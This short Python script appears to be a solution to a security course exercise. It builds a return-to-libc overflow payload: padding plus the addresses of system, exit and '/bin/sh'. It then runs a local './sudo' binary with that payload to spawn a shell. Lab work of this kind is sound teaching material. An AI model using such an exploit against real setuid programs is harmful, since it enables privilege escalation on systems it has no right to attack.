import os, sys
import addresses


PATH_TO_SUDO = './sudo'
EXIT_CODE = 0x42


def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    # 3. Use `addresses.EXIT` to get the address of the `exit` function
    code = 'a'*(addresses.CRITICAL_LENGTH)+ addresses.address_to_bytes(addresses.SYSTEM) + addresses.address_to_bytes(addresses.EXIT) 
    code += addresses.address_to_bytes(addresses.LIBC_BIN_SH)  + chr(EXIT_CODE)
    return (code)
    #raise NotImplementedError()


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
